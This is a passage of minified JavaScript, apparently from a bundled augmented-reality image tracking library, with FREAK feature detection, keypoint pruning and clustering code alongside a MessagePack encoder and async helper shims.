                for (let a = 0; a < t.shape[1]; a++)
                    for (let c = a + 1; c < t.shape[1]; c++)
                        s.push(a),
                        o.push(c);
                const r = tn(s, [s.length]).cast("int32")
                  , i = tn(o, [o.length]).cast("int32");
                this.tensorCaches.computeFreakDescriptors = {
                    positionT: en(On([r, i], 1))
                }
            }
            const {positionT: e} = this.tensorCaches.computeFreakDescriptors;
            return M((()=>zt().runKernel("ComputeFreakDescriptors", {
                extremaFreaks: t,
                positionT: e
            })))
        }
        _computeExtremaFreak(t, e, s) {
            this.tensorCaches._computeExtremaFreak || M((()=>{
                const i = tn($o);
                this.tensorCaches._computeExtremaFreak = {
                    freakPointsT: en(i)
                }
            }
            ));
            const {freakPointsT: o} = this.tensorCaches._computeExtremaFreak
              , r = [];
            for (let i = 1; i < t.length; i++)
                r.push(t[i][1]);
            return M((()=>zt().runKernel("ComputeExtremaFreak", {
                gaussianImagesT: r,
                prunedExtremas: e,
                prunedExtremasAngles: s,
                freakPointsT: o,
                pyramidImagesLength: t.length
            })))
        }
        _computeExtremaAngles(t) {
            return M((()=>zt().runKernel("ComputeExtremaAngles", {
                histograms: t
            })))
        }
        _computeOrientationHistograms(t, e) {
            const s = [];
            for (let r = 1; r < e.length; r++)
                s.push(e[r][1]);
            this.tensorCaches.orientationHistograms || M((()=>{
                const r = -1 / 18
                  , a = Math.ceil(4.5)
                  , c = [];
                for (let l = -a; l <= a; l++)
                    for (let u = -a; u <= a; u++) {
                        const d = u * u + l * l;
                        if (d <= 20.25) {
                            const h = d * r;
                            let p = .0013888888 * (720 + h * (720 + h * (360 + h * (120 + h * (30 + h * (6 + h))))));
                            c.push([l, u, p])
                        }
                    }
                this.tensorCaches.orientationHistograms = {
                    radialPropertiesT: en(tn(c, [c.length, 3]))
                }
            }
            ));
            const {radialPropertiesT: o} = this.tensorCaches.orientationHistograms;
            return M((()=>zt().runKernel("ComputeOrientationHistograms", {
                gaussianImagesT: s,
                prunedExtremasT: t,
                radialPropertiesT: o,
                pyramidImagesLength: e.length
            })))
        }
        _smoothHistograms(t) {
            return M((()=>zt().runKernel("SmoothHistograms", {
                histograms: t
            })))
        }
        _computeLocalization(t, e) {
            return M((()=>{
                const o = zt().runKernel("ComputeLocalization", {
                    prunedExtremasList: t,
                    dogPyramidImagesT: e
                }).arraySync()
                  , r = [];
                for (let a = 0; a < o.length; a++) {
                    r.push([]);
                    for (let c = 0; c < o[a].length; c++)
                        r[a].push([])
                }
                const i = [];
                for (let a = 0; a < t.length; a++)
                    i[a] = [t[a][0], t[a][1], t[a][2], t[a][3]];
                for (let a = 0; a < i.length; a++) {
                    if (0 === i[a][0])
                        continue;
                    const c = o[a]
                      , l = .5 * (c[1][2] - c[1][0])
                      , u = .5 * (c[2][1] - c[0][1])
                      , d = c[1][2] + c[1][0] - 2 * c[1][1]
                      , h = c[2][1] + c[0][1] - 2 * c[1][1]
                      , p = .25 * (c[0][0] + c[2][2] - c[0][2] - c[2][0])
                      , f = d * h - p * p
                      , m = (h * -l + -p * -u) / f
                      , g = (-p * -l + d * -u) / f
                      , b = i[a][2] + g
                      , x = i[a][3] + m;
                    Math.abs(f) < 1e-4 || (i[a][2] = b,
                    i[a][3] = x)
                }
                return tn(i, [i.length, i[0].length], "float32")
            }
            ))
        }
        _applyPrune(t) {
            const o = []
              , r = [];
            for (let a = 0; a < 100; a++) {
                r.push([]),
                o.push([]);
                for (let c = 0; c < 5; c++)
                    r[a].push([0, 0, 0, 0]),
                    o[a].push(0)
            }
            M((()=>{
                for (let a = 0; a < t.length; a++) {
                    const c = zt().runKernel("ExtremaReduction", {
                        extremasResultT: t[a]
                    })
                      , l = a + 1
                      , u = c.arraySync()
                      , d = c.shape[0]
                      , h = c.shape[1]
                      , p = 2 * h / 10
                      , f = 2 * d / 10;
                    for (let m = 0; m < d; m++)
                        for (let g = 0; g < h; g++) {
                            const b = u[m][g];
                            if (0 == b)
                                continue;
                            const x = b % 1e3
                              , I = Math.floor(Math.abs(b) / 1e3)
                              , y = 2 * g + (2 === I || 3 === I ? 1 : 0)
                              , w = 2 * m + (1 === I || 3 === I ? 1 : 0)
                              , C = Math.floor(y / p)
                              , S = 10 * Math.floor(w / f) + C
                              , T = Math.abs(x);
                            let R = 5;
                            for (; R >= 1 && T > o[S][R - 1]; )
                                R -= 1;
                            if (R < 5) {
                                for (let L = 4; L >= R + 1; L--)
                                    o[S][L] = o[S][L - 1],
                                    r[S][L][0] = r[S][L - 1][0],
                                    r[S][L][1] = r[S][L - 1][1],
                                    r[S][L][2] = r[S][L - 1][2],
                                    r[S][L][3] = r[S][L - 1][3];
                                o[S][R] = T,
                                r[S][R][0] = x,
                                r[S][R][1] = l,
                                r[S][R][2] = w,
                                r[S][R][3] = y
                            }
                        }
                }
            }
            ));
            const i = [];
            for (let a = 0; a < 100; a++)
                for (let c = 0; c < 5; c++)
                    i.push(r[a][c]);
            return i
        }
        _buildExtremas(t, e, s) {
            return M((()=>zt().runKernel("BuildExtremas", {
                image0: t,
                image1: e,
                image2: s
            })))
        }
        _differenceImageBinomial(t, e) {
            return M((()=>t.sub(e)))
        }
        _applyFilter(t) {
            return M((()=>zt().runKernel("BinomialFilter", {
                image: t
            })))
        }
        _downsampleBilinear(t) {
            return M((()=>zt().runKernel("DownsampleBilinear", {
                image: t
            })))
        }
        _compileAndRun(t, e) {
            const s = ys().compileAndRun(t, e);
            return zt().makeTensorFromDataId(s.dataId, s.shape, s.dtype)
        }
        _runWebGLProgram(t, e, s) {
            const o = ys().runWebGLProgram(t, e, s);
            return zt().makeTensorFromDataId(o.dataId, o.shape, o.dtype)
        }
    }
    class F9 {
        constructor(t, e, s=!1) {
            this.debugMode = s,
            this.width = t,
            this.height = e;
            let o = Math.min(t, e) / 2
              , r = Math.pow(2, Math.round(Math.log(o) / Math.log(2)));
            this.cropSize = r,
            this.detector = new GI(r,r,s),
            this.kernelCaches = {},
            this.lastRandomIndex = 4
        }
        detect(t) {
            const e = Math.floor(this.height / 2 - this.cropSize / 2)
              , s = Math.floor(this.width / 2 - this.cropSize / 2)
              , o = this._detect(t, s, e);
            return this.debugMode && (o.debugExtra.crop = {
                startX: s,
                startY: e,
                cropSize: this.cropSize
            }),
            o
        }
        detectMoving(t) {
            const e = this.lastRandomIndex % 3
              , s = Math.floor(this.lastRandomIndex / 3);
            let o = Math.floor(this.height / 2 - this.cropSize + s * this.cropSize / 2)
              , r = Math.floor(this.width / 2 - this.cropSize + e * this.cropSize / 2);
            return r < 0 && (r = 0),
            o < 0 && (o = 0),
            r >= this.width - this.cropSize && (r = this.width - this.cropSize - 1),
            o >= this.height - this.cropSize && (o = this.height - this.cropSize - 1),
            this.lastRandomIndex = (this.lastRandomIndex + 1) % 9,
            this._detect(t, r, o)
        }
        _detect(t, e, s) {
            const o = t.slice([s, e], [this.cropSize, this.cropSize])
              , {featurePoints: r, debugExtra: i} = this.detector.detect(o);
            return r.forEach((a=>{
                a.x += e,
                a.y += s
            }
            )),
            this.debugMode && (i.projectedImage = o.arraySync()),
            o.dispose(),
            {
                featurePoints: r,
                debugExtra: i
            }
        }
    }
    const LI = ({image: n, ratio: t})=>{
        const e = Math.round(n.width * t)
          , s = Math.round(n.height * t)
          , o = new Uint8Array(e * s);
        for (let r = 0; r < e; r++) {
            let i = Math.round(1 * r / t)
              , a = Math.round(1 * (r + 1) / t) - 1;
            a >= n.width && (a = n.width - 1);
            for (let c = 0; c < s; c++) {
                let l = Math.round(1 * c / t)
                  , u = Math.round(1 * (c + 1) / t) - 1;
                u >= n.height && (u = n.height - 1);
                let d = 0
                  , h = 0;
                for (let p = i; p <= a; p++)
                    for (let f = l; f <= u; f++)
                        d += 1 * n.data[f * n.width + p],
                        h += 1;
                o[c * e + r] = Math.floor(d / h)
            }
        }
        return {
            data: o,
            width: e,
            height: s
        }
    }
      , X9 = n=>{
        const e = [];
        let s = 100 / Math.min(n.width, n.height);
        for (; ; )
            if (e.push(s),
            s *= Math.pow(2, 1 / 3),
            s >= .95) {
                s = 1;
                break
            }
        e.push(s),
        e.reverse();
        const o = [];
        for (let r = 0; r < e.length; r++)
            n.width,
            e[r],
            n.height,
            e[r],
            o.push(Object.assign(LI({
                image: n,
                ratio: e[r]
            }), {
                scale: e[r]
            }));
        return o
    }
      , A9 = n=>{
        const t = Math.min(n.width, n.height)
          , e = []
          , s = [];
        e.push(256 / t),
        e.push(128 / t);
        for (let o = 0; o < e.length; o++)
            s.push(Object.assign(LI({
                image: n,
                ratio: e[o]
            }), {
                scale: e[o]
            }));
        return s
    }
      , P9 = n=>{
        const {v1: t, v2: e} = n;
        let s = 0;
        for (let o = 0; o < t.length; o++) {
            let r = (t[o] ^ e[o]) >>> 0;
            s += O9(r)
        }
        return s
    }
      , O9 = n=>{
        var t = n - (n >> 1 & 1431655765);
        return t = ((t = ((t = ((t = (t >> 2 & 858993459) + (858993459 & t)) >> 4) + t & 252645135) >> 8) + t & 16711935) >> 16) + t & 65535
    }
      , Z9 = ()=>({
        seed: 1234,
        arrayShuffle(t) {
            const {arr: e, sampleSize: s} = t;
            for (let o = 0; o < s; o++) {
                this.seed = (214013 * this.seed + 2531011) % -2147483648;
                let r = this.seed >> 16 & 32767;
                r %= e.length;
                let i = e[o];
                e[o] = e[r],
                e[r] = i
            }
        },
        nextInt(t) {
            this.seed = (214013 * this.seed + 2531011) % -2147483648;
            let e = this.seed >> 16 & 32767;
            return e %= t,
            e
        }
    })
      , EI = ({points: n})=>{
        const t = [];
        for (let o = 0; o < n.length; o++)
            t.push(o);
        const e = Z9();
        return {
            rootNode: DI({
                points: n,
                pointIndexes: t,
                centerPointIndex: null,
                randomizer: e
            })
        }
    }
      , DI = n=>{
        const {points: t, pointIndexes: e, centerPointIndex: s, randomizer: o} = n;
        let r = !1;
        (e.length <= 8 || e.length <= 16) && (r = !0);
        const i = {};
        if (!r) {
            const c = (n=>{
                const {points: t, pointIndexes: e, randomizer: s} = n
                  , o = [];
                for (let c = 0; c < e.length; c++)
                    o.push(c);
                let r = Number.MAX_SAFE_INTEGER
                  , i = -1;
                const a = [];
                for (let c = 0; c < 128; c++) {
                    s.arrayShuffle({
                        arr: o,
                        sampleSize: 8
                    });
                    let l = 0;
                    const u = [];
                    for (let d = 0; d < e.length; d++) {
                        let h = Number.MAX_SAFE_INTEGER;
                        for (let p = 0; p < 8; p++) {
                            const f = e[o[p]]
                              , m = P9({
                                v1: t[e[d]].descriptors,
                                v2: t[f].descriptors
                            });
                            m < h && (u[d] = o[p],
                            h = m)
                        }
                        l += h
                    }
                    a.push(u),
                    l < r && (r = l,
                    i = c)
                }
                return a[i]
            }
            )({
                points: t,
                pointIndexes: e,
                randomizer: o
            });
            for (let l = 0; l < c.length; l++)
                void 0 === i[e[c[l]]] && (i[e[c[l]]] = []),
                i[e[c[l]]].push(e[l])
        }
        1 === Object.keys(i).length && (r = !0);
        const a = {
            centerPointIndex: s
        };
        if (r) {
            a.leaf = !0,
            a.pointIndexes = [];
            for (let c = 0; c < e.length; c++)
                a.pointIndexes.push(e[c]);
            return a
        }
        return a.leaf = !1,
        a.children = [],
        Object.keys(i).forEach((c=>{
            a.children.push(DI({
                points: t,
                pointIndexes: i[c],
                centerPointIndex: c,
                randomizer: o
            }))
        }
        )),
        a
    }
    ;
    var Go = 4294967295;
    function WI(n, t, e) {
        var s = Math.floor(e / 4294967296)
          , o = e;
        n.setUint32(t, s),
        n.setUint32(t + 4, o)
    }
    function MI(n, t) {
        return 4294967296 * n.getInt32(t) + n.getUint32(t + 4)
    }
    var jp, qp, tf, Al = (typeof process > "u" || "never" !== (null === (jp = null == process ? void 0 : process.env) || void 0 === jp ? void 0 : jp.TEXT_ENCODING)) && typeof TextEncoder < "u" && typeof TextDecoder < "u";
    function VI(n) {
        for (var t = n.length, e = 0, s = 0; s < t; ) {
            var o = n.charCodeAt(s++);
            if (4294967168 & o)
                if (4294965248 & o) {
                    if (o >= 55296 && o <= 56319 && s < t) {
                        var r = n.charCodeAt(s);
                        56320 == (64512 & r) && (++s,
                        o = ((1023 & o) << 10) + (1023 & r) + 65536)
                    }
                    e += 4294901760 & o ? 4 : 3
                } else
                    e += 2;
            else
                e++
        }
        return e
    }
    var ma = Al ? new TextEncoder : void 0
      , J9 = Al ? typeof process < "u" && "force" !== (null === (qp = null == process ? void 0 : process.env) || void 0 === qp ? void 0 : qp.TEXT_ENCODING) ? 200 : 0 : Go;
    var t_ = null != ma && ma.encodeInto ? function q9(n, t, e) {
        ma.encodeInto(n, t.subarray(e))
    }
    : function j9(n, t, e) {
        t.set(ma.encode(n), e)
    }
    ;
    function FI(n, t, e) {
        for (var s = t, o = s + e, r = [], i = ""; s < o; ) {
            var a = n[s++];
            if (128 & a)
                if (192 == (224 & a)) {
                    var c = 63 & n[s++];
                    r.push((31 & a) << 6 | c)
                } else if (224 == (240 & a)) {
                    c = 63 & n[s++];
                    var l = 63 & n[s++];
                    r.push((31 & a) << 12 | c << 6 | l)
                } else if (240 == (248 & a)) {
                    var d = (7 & a) << 18 | (c = 63 & n[s++]) << 12 | (l = 63 & n[s++]) << 6 | 63 & n[s++];
                    d > 65535 && (d -= 65536,
                    r.push(d >>> 10 & 1023 | 55296),
                    d = 56320 | 1023 & d),
                    r.push(d)
                } else
                    r.push(a);
            else
                r.push(a);
            r.length >= 4096 && (i += String.fromCharCode.apply(String, r),
            r.length = 0)
        }
        return r.length > 0 && (i += String.fromCharCode.apply(String, r)),
        i
    }
    var n_ = Al ? new TextDecoder : null
      , s_ = Al ? typeof process < "u" && "force" !== (null === (tf = null == process ? void 0 : process.env) || void 0 === tf ? void 0 : tf.TEXT_DECODER) ? 200 : 0 : Go;
    var Pl = function n(t, e) {
        this.type = t,
        this.data = e
    }
      , r_ = function() {
        var n = function(t, e) {
            return (n = Object.setPrototypeOf || {
                __proto__: []
            }instanceof Array && function(s, o) {
                s.__proto__ = o
            }
            || function(s, o) {
                for (var r in o)
                    Object.prototype.hasOwnProperty.call(o, r) && (s[r] = o[r])
            }
            )(t, e)
        };
        return function(t, e) {
            if ("function" != typeof e && null !== e)
                throw new TypeError("Class extends value " + String(e) + " is not a constructor or null");
            function s() {
                this.constructor = t
            }
            n(t, e),
            t.prototype = null === e ? Object.create(e) : (s.prototype = e.prototype,
            new s)
        }
    }()
      , ts = function(n) {
        function t(e) {
            var s = n.call(this, e) || this
              , o = Object.create(t.prototype);
            return Object.setPrototypeOf(s, o),
            Object.defineProperty(s, "name", {
                configurable: !0,
                enumerable: !1,
                value: t.name
            }),
            s
        }
        return r_(t, n),
        t
    }(Error)
      , a_ = 4294967295
      , c_ = 17179869183;
    var f_ = {
        type: -1,
        encode: function d_(n) {
            if (n instanceof Date) {
                var t = function u_(n) {
                    var t = n.getTime()
                      , e = Math.floor(t / 1e3)
                      , s = 1e6 * (t - 1e3 * e)
                      , o = Math.floor(s / 1e9);
                    return {
                        sec: e + o,
                        nsec: s - 1e9 * o
                    }
                }(n);
                return function l_(n) {
                    var o, t = n.sec, e = n.nsec;
                    if (t >= 0 && e >= 0 && t <= c_) {
                        if (0 === e && t <= a_) {
                            var s = new Uint8Array(4);
                            return (o = new DataView(s.buffer)).setUint32(0, t),
                            s
                        }
                        var r = t / 4294967296
                          , i = 4294967295 & t;
                        return s = new Uint8Array(8),
                        (o = new DataView(s.buffer)).setUint32(0, e << 2 | 3 & r),
                        o.setUint32(4, i),
                        s
                    }
                    return s = new Uint8Array(12),
                    (o = new DataView(s.buffer)).setUint32(0, e),
                    WI(o, 4, t),
                    s
                }(t)
            }
            return null
        },
        decode: function p_(n) {
            var t = function h_(n) {
                var t = new DataView(n.buffer,n.byteOffset,n.byteLength);
                switch (n.byteLength) {
                case 4:
                    return {
                        sec: t.getUint32(0),
                        nsec: 0
                    };
                case 8:
                    var o = t.getUint32(0);
                    return {
                        sec: 4294967296 * (3 & o) + t.getUint32(4),
                        nsec: o >>> 2
                    };
                case 12:
                    return {
                        sec: MI(t, 4),
                        nsec: t.getUint32(0)
                    };
                default:
                    throw new ts("Unrecognized data size for timestamp (expected 4, 8, or 12): ".concat(n.length))
                }
            }(n);
            return new Date(1e3 * t.sec + t.nsec / 1e6)
        }
    }
      , zI = function() {
        function n() {
            this.builtInEncoders = [],
            this.builtInDecoders = [],
            this.encoders = [],
            this.decoders = [],
            this.register(f_)
        }
        return n.prototype.register = function(t) {
            var e = t.type
              , s = t.encode
              , o = t.decode;
            if (e >= 0)
                this.encoders[e] = s,
                this.decoders[e] = o;
            else {
                var r = 1 + e;
                this.builtInEncoders[r] = s,
                this.builtInDecoders[r] = o
            }
        }
        ,
        n.prototype.tryToEncode = function(t, e) {
            for (var s = 0; s < this.builtInEncoders.length; s++) {
                if (null != (o = this.builtInEncoders[s]))
                    if (null != (r = o(t, e)))
                        return new Pl(-1 - s,r)
            }
            for (s = 0; s < this.encoders.length; s++) {
                var o, r;
                if (null != (o = this.encoders[s]))
                    if (null != (r = o(t, e)))
                        return new Pl(s,r)
            }
            return t instanceof Pl ? t : null
        }
        ,
        n.prototype.decode = function(t, e, s) {
            var o = e < 0 ? this.builtInDecoders[-1 - e] : this.decoders[e];
            return o ? o(t, e, s) : new Pl(e,t)
        }
        ,
        n.defaultCodec = new n,
        n
    }();
    function Ol(n) {
        return n instanceof Uint8Array ? n : ArrayBuffer.isView(n) ? new Uint8Array(n.buffer,n.byteOffset,n.byteLength) : n instanceof ArrayBuffer ? new Uint8Array(n) : Uint8Array.from(n)
    }
    var x_ = function() {
        function n(t, e, s, o, r, i, a, c) {
            void 0 === t && (t = zI.defaultCodec),
            void 0 === e && (e = void 0),
            void 0 === s && (s = 100),
            void 0 === o && (o = 2048),
            void 0 === r && (r = !1),
            void 0 === i && (i = !1),
            void 0 === a && (a = !1),
            void 0 === c && (c = !1),
            this.extensionCodec = t,
            this.context = e,
            this.maxDepth = s,
            this.initialBufferSize = o,
            this.sortKeys = r,
            this.forceFloat32 = i,
            this.ignoreUndefined = a,
            this.forceIntegerToFloat = c,
            this.pos = 0,
            this.view = new DataView(new ArrayBuffer(this.initialBufferSize)),
            this.bytes = new Uint8Array(this.view.buffer)
        }
        return n.prototype.reinitializeState = function() {
            this.pos = 0
        }
        ,
        n.prototype.encodeSharedRef = function(t) {
            return this.reinitializeState(),
            this.doEncode(t, 1),
            this.bytes.subarray(0, this.pos)
        }
        ,
        n.prototype.encode = function(t) {
            return this.reinitializeState(),
            this.doEncode(t, 1),
            this.bytes.slice(0, this.pos)
        }
        ,
        n.prototype.doEncode = function(t, e) {
            if (e > this.maxDepth)
                throw new Error("Too deep objects in depth ".concat(e));
            null == t ? this.encodeNil() : "boolean" == typeof t ? this.encodeBoolean(t) : "number" == typeof t ? this.encodeNumber(t) : "string" == typeof t ? this.encodeString(t) : this.encodeObject(t, e)
        }
        ,
        n.prototype.ensureBufferSizeToWrite = function(t) {
            var e = this.pos + t;
            this.view.byteLength < e && this.resizeBuffer(2 * e)
        }
        ,
        n.prototype.resizeBuffer = function(t) {
            var e = new ArrayBuffer(t)
              , s = new Uint8Array(e)
              , o = new DataView(e);
            s.set(this.bytes),
            this.view = o,
            this.bytes = s
        }
        ,
        n.prototype.encodeNil = function() {
            this.writeU8(192)
        }
        ,
        n.prototype.encodeBoolean = function(t) {
            !1 === t ? this.writeU8(194) : this.writeU8(195)
        }
        ,
        n.prototype.encodeNumber = function(t) {
            Number.isSafeInteger(t) && !this.forceIntegerToFloat ? t >= 0 ? t < 128 ? this.writeU8(t) : t < 256 ? (this.writeU8(204),
            this.writeU8(t)) : t < 65536 ? (this.writeU8(205),
            this.writeU16(t)) : t < 4294967296 ? (this.writeU8(206),
            this.writeU32(t)) : (this.writeU8(207),
            this.writeU64(t)) : t >= -32 ? this.writeU8(224 | t + 32) : t >= -128 ? (this.writeU8(208),
            this.writeI8(t)) : t >= -32768 ? (this.writeU8(209),
            this.writeI16(t)) : t >= -2147483648 ? (this.writeU8(210),
            this.writeI32(t)) : (this.writeU8(211),
            this.writeI64(t)) : this.forceFloat32 ? (this.writeU8(202),
            this.writeF32(t)) : (this.writeU8(203),
            this.writeF64(t))
        }
        ,
        n.prototype.writeStringHeader = function(t) {
            if (t < 32)
                this.writeU8(160 + t);
            else if (t < 256)
                this.writeU8(217),
                this.writeU8(t);
            else if (t < 65536)
                this.writeU8(218),
                this.writeU16(t);
            else {
                if (!(t < 4294967296))
                    throw new Error("Too long string: ".concat(t, " bytes in UTF-8"));
                this.writeU8(219),
                this.writeU32(t)
            }
        }
        ,
        n.prototype.encodeString = function(t) {
            if (t.length > J9) {
                var o = VI(t);
                this.ensureBufferSizeToWrite(5 + o),
                this.writeStringHeader(o),
                t_(t, this.bytes, this.pos),
                this.pos += o
            } else {
                o = VI(t);
                this.ensureBufferSizeToWrite(5 + o),
                this.writeStringHeader(o),
                function Q9(n, t, e) {
                    for (var s = n.length, o = e, r = 0; r < s; ) {
                        var i = n.charCodeAt(r++);
                        if (4294967168 & i) {
                            if (4294965248 & i) {
                                if (i >= 55296 && i <= 56319 && r < s) {
                                    var a = n.charCodeAt(r);
                                    56320 == (64512 & a) && (++r,
                                    i = ((1023 & i) << 10) + (1023 & a) + 65536)
                                }
                                4294901760 & i ? (t[o++] = i >> 18 & 7 | 240,
                                t[o++] = i >> 12 & 63 | 128,
                                t[o++] = i >> 6 & 63 | 128) : (t[o++] = i >> 12 & 15 | 224,
                                t[o++] = i >> 6 & 63 | 128)
                            } else
                                t[o++] = i >> 6 & 31 | 192;
                            t[o++] = 63 & i | 128
                        } else
                            t[o++] = i
                    }
                }(t, this.bytes, this.pos),
                this.pos += o
            }
        }
        ,
        n.prototype.encodeObject = function(t, e) {
            var s = this.extensionCodec.tryToEncode(t, this.context);
            if (null != s)
                this.encodeExtension(s);
            else if (Array.isArray(t))
                this.encodeArray(t, e);
            else if (ArrayBuffer.isView(t))
                this.encodeBinary(t);
            else {
                if ("object" != typeof t)
                    throw new Error("Unrecognized object: ".concat(Object.prototype.toString.apply(t)));
                this.encodeMap(t, e)
            }
        }
        ,
        n.prototype.encodeBinary = function(t) {
            var e = t.byteLength;
            if (e < 256)
                this.writeU8(196),
                this.writeU8(e);
            else if (e < 65536)
                this.writeU8(197),
                this.writeU16(e);
            else {
                if (!(e < 4294967296))
                    throw new Error("Too large binary: ".concat(e));
                this.writeU8(198),
                this.writeU32(e)
            }
            var s = Ol(t);
            this.writeU8a(s)
        }
        ,
        n.prototype.encodeArray = function(t, e) {
            var s = t.length;
            if (s < 16)
                this.writeU8(144 + s);
            else if (s < 65536)
                this.writeU8(220),
                this.writeU16(s);
            else {
                if (!(s < 4294967296))
                    throw new Error("Too large array: ".concat(s));
                this.writeU8(221),
                this.writeU32(s)
            }
            for (var o = 0, r = t; o < r.length; o++) {
                var i = r[o];
                this.doEncode(i, e + 1)
            }
        }
        ,
        n.prototype.countWithoutUndefined = function(t, e) {
            for (var s = 0, o = 0, r = e; o < r.length; o++) {
                void 0 !== t[r[o]] && s++
            }
            return s
        }
        ,
        n.prototype.encodeMap = function(t, e) {
            var s = Object.keys(t);
            this.sortKeys && s.sort();
            var o = this.ignoreUndefined ? this.countWithoutUndefined(t, s) : s.length;
            if (o < 16)
                this.writeU8(128 + o);
            else if (o < 65536)
                this.writeU8(222),
                this.writeU16(o);
            else {
                if (!(o < 4294967296))
                    throw new Error("Too large map object: ".concat(o));
                this.writeU8(223),
                this.writeU32(o)
            }
            for (var r = 0, i = s; r < i.length; r++) {
                var a = i[r]
                  , c = t[a];
                this.ignoreUndefined && void 0 === c || (this.encodeString(a),
                this.doEncode(c, e + 1))
            }
        }
        ,
        n.prototype.encodeExtension = function(t) {
            var e = t.data.length;
            if (1 === e)
                this.writeU8(212);
            else if (2 === e)
                this.writeU8(213);
            else if (4 === e)
                this.writeU8(214);
            else if (8 === e)
                this.writeU8(215);
            else if (16 === e)
                this.writeU8(216);
            else if (e < 256)
                this.writeU8(199),
                this.writeU8(e);
            else if (e < 65536)
                this.writeU8(200),
                this.writeU16(e);
            else {
                if (!(e < 4294967296))
                    throw new Error("Too large extension object: ".concat(e));
                this.writeU8(201),
                this.writeU32(e)
            }
            this.writeI8(t.type),
            this.writeU8a(t.data)
        }
        ,
        n.prototype.writeU8 = function(t) {
            this.ensureBufferSizeToWrite(1),
            this.view.setUint8(this.pos, t),
            this.pos++
        }
        ,
        n.prototype.writeU8a = function(t) {
            var e = t.length;
            this.ensureBufferSizeToWrite(e),
            this.bytes.set(t, this.pos),
            this.pos += e
        }
        ,
        n.prototype.writeI8 = function(t) {
            this.ensureBufferSizeToWrite(1),
            this.view.setInt8(this.pos, t),
            this.pos++
        }
        ,
        n.prototype.writeU16 = function(t) {
            this.ensureBufferSizeToWrite(2),
            this.view.setUint16(this.pos, t),
            this.pos += 2
        }
        ,
        n.prototype.writeI16 = function(t) {
            this.ensureBufferSizeToWrite(2),
            this.view.setInt16(this.pos, t),
            this.pos += 2
        }
        ,
        n.prototype.writeU32 = function(t) {
            this.ensureBufferSizeToWrite(4),
            this.view.setUint32(this.pos, t),
            this.pos += 4
        }
        ,
        n.prototype.writeI32 = function(t) {
            this.ensureBufferSizeToWrite(4),
            this.view.setInt32(this.pos, t),
            this.pos += 4
        }
        ,
        n.prototype.writeF32 = function(t) {
            this.ensureBufferSizeToWrite(4),
            this.view.setFloat32(this.pos, t),
            this.pos += 4
        }
        ,
        n.prototype.writeF64 = function(t) {
            this.ensureBufferSizeToWrite(8),
            this.view.setFloat64(this.pos, t),
            this.pos += 8
        }
        ,
        n.prototype.writeU64 = function(t) {
            this.ensureBufferSizeToWrite(8),
            function U9(n, t, e) {
                var s = e / 4294967296
                  , o = e;
                n.setUint32(t, s),
                n.setUint32(t + 4, o)
            }(this.view, this.pos, t),
            this.pos += 8
        }
        ,
        n.prototype.writeI64 = function(t) {
            this.ensureBufferSizeToWrite(8),
            WI(this.view, this.pos, t),
            this.pos += 8
        }
        ,
        n
    }()
      , y_ = {};
    function ef(n) {
        return "".concat(n < 0 ? "-" : "", "0x").concat(Math.abs(n).toString(16).padStart(2, "0"))
    }
    var v_ = function() {
        function n(t, e) {
            void 0 === t && (t = 16),
            void 0 === e && (e = 16),
            this.maxKeyLength = t,
            this.maxLengthPerKey = e,
            this.hit = 0,
            this.miss = 0,
            this.caches = [];
            for (var s = 0; s < this.maxKeyLength; s++)
                this.caches.push([])
        }
        return n.prototype.canBeCached = function(t) {
            return t > 0 && t <= this.maxKeyLength
        }
        ,
        n.prototype.find = function(t, e, s) {
            t: for (var r = 0, i = this.caches[s - 1]; r < i.length; r++) {
                for (var a = i[r], c = a.bytes, l = 0; l < s; l++)
                    if (c[l] !== t[e + l])
                        continue t;
                return a.str
            }
            return null
        }
        ,
        n.prototype.store = function(t, e) {
            var s = this.caches[t.length - 1]
              , o = {
                bytes: t,
                str: e
            };
            s.length >= this.maxLengthPerKey ? s[Math.random() * s.length | 0] = o : s.push(o)
        }
        ,
        n.prototype.decode = function(t, e, s) {
            var o = this.find(t, e, s);
            if (null != o)
                return this.hit++,
                o;
            this.miss++;
            var r = FI(t, e, s)
              , i = Uint8Array.prototype.slice.call(t, e, e + s);
            return this.store(i, r),
            r
        }
        ,
        n
    }()
      , S_ = function(n, t, e, s) {
        return new (e || (e = Promise))((function(r, i) {
            function a(u) {
                try {
                    l(s.next(u))
                } catch (d) {
                    i(d)
                }
            }
            function c(u) {
                try {
                    l(s.throw(u))
                } catch (d) {
                    i(d)
                }
            }
            function l(u) {
                u.done ? r(u.value) : function o(r) {
                    return r instanceof e ? r : new e((function(i) {
                        i(r)
                    }
                    ))
                }(u.value).then(a, c)
            }
            l((s = s.apply(n, t || [])).next())
        }
        ))
    }
      , nf = function(n, t) {
        var s, o, r, i, e = {
            label: 0,
            sent: function() {
                if (1 & r[0])
                    throw r[1];
                return r[1]
            },
            trys: [],
            ops: []
        };
        return i = {
            next: a(0),
            throw: a(1),
            return: a(2)
        },
        "function" == typeof Symbol && (i[Symbol.iterator] = function() {
            return this
        }
        ),
        i;
        function a(l) {
            return function(u) {
                return function c(l) {
                    if (s)
                        throw new TypeError("Generator is already executing.");
                    for (; e; )
                        try {
                            if (s = 1,
                            o && (r = 2 & l[0] ? o.return : l[0] ? o.throw || ((r = o.return) && r.call(o),
                            0) : o.next) && !(r = r.call(o, l[1])).done)
                                return r;
                            switch (o = 0,
                            r && (l = [2 & l[0], r.value]),
                            l[0]) {
                            case 0:
                            case 1:
                                r = l;
                                break;
                            case 4:
                                return e.label++,
                                {
                                    value: l[1],
                                    done: !1
                                };
                            case 5:
                                e.label++,
                                o = l[1],
                                l = [0];
                                continue;
                            case 7:
                                l = e.ops.pop(),
                                e.trys.pop();
                                continue;
                            default:
                                if (!(r = (r = e.trys).length > 0 && r[r.length - 1]) && (6 === l[0] || 2 === l[0])) {
                                    e = 0;
                                    continue
                                }
                                if (3 === l[0] && (!r || l[1] > r[0] && l[1] < r[3])) {
                                    e.label = l[1];
                                    break
                                }
                                if (6 === l[0] && e.label < r[1]) {
                                    e.label = r[1],
                                    r = l;
                                    break
                                }
                                if (r && e.label < r[2]) {
                                    e.label = r[2],
                                    e.ops.push(l);
                                    break
                                }
                                r[2] && e.ops.pop(),
                                e.trys.pop();
                                continue
                            }
                            l = t.call(n, e)
                        } catch (u) {
                            l = [6, u],
                            o = 0
                        } finally {
                            s = r = 0
                        }
                    if (5 & l[0])
                        throw l[1];
                    return {
                        value: l[0] ? l[1] : void 0,
                        done: !0
                    }
                }([l, u])
            }
        }
    }
      , XI = function(n) {
        if (!Symbol.asyncIterator)
            throw new TypeError("Symbol.asyncIterator is not defined.");
        var e, t = n[Symbol.asyncIterator];
